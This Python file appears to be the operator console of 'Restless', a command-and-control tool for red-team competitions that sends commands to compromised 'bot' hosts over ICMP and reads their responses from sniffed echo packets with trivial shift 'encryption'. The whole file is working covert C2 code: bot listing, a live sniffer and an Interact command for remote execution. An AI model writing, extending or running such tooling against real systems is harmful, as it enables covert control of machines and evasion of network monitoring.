"""
Restless CLI :)

Author's website: Mohad.red
"""
from Packets import *
from Config import *
from scapy.all import *
from cmd import Cmd
from threading import Thread

"""
Reads coming data from the blue servers
"""
def pkt_callback(pkt):
    packet = pkt
    # Since the client sends back the "output" in a type 8 ICMP packet.
    if str(packet.getlayer(ICMP).type) == "8":
        try:
            print("Coming beacon from : "+packet[IP].src)
            data = packet[Raw].load
            # Don't forget the "encryption" lol
            data = shift(data, -1, sender = False)
            print(data)
        except:
            if debug:
                print("Failed to read pkt_callback()")

"""
Live sniff.
"""
def listen():
    pkts = sniff(iface=BLUE_TEAM_INTERFACE,filter="icmp", prn=pkt_callback, store=0)


class MyPrompt(Cmd):
    prompt = 'Restless> '
    intro = "Welcome! Type ? to list commands"

    def do_exit(self, inp):
        print("Bye")
        #print("adding '{}'".format(inp))
        return True

    def help_exit(self):
        print('exit the application. Shorthand: x q Ctrl-D.')

    def do_List(self, line):
        print("Bots:")
        for ip in listOfIPs:
            print(ip)

    def help_List(self):
        print("List all bots.\n"
              "Usage: List\n")

    def do_Interact(self, line):
        line = line.split(' ')
        if len(line) < 2:
            if len(line) < 1:
                self.do_List("")
            return self.help_Interact()
        IP = line[0]
        COMMAND = line[1:]
        COMMAND = ' '.join(COMMAND)
        print(COMMAND)
        try:
            SendIt(IP, COMMAND)
        except:
            print("Something bad happened! Try again")
        pass

    def help_Interact(self):
        print("Interact with a bot.\n"
              "Usage: Interact <IP> <COMMAND>\n")

    def default(self, inp):
        if inp == 'x' or inp == 'q':
            return self.do_exit(inp)

        #print("Default: {}".format(inp))
        print("Try again")
    # do_EOF = do_exit
    # help_EOF = help_exit


if __name__ == '__main__':
    # Load all blue team ip addresses
    loadIPs()
    # In this case 'urls' is a list of urls to be crawled.
    t = Thread(target=listen, args=[])
    # To allow Control + C
    t.daemon = True
    # Start listening for responses
    t.start()
    # Start
    MyPrompt().cmdloop()


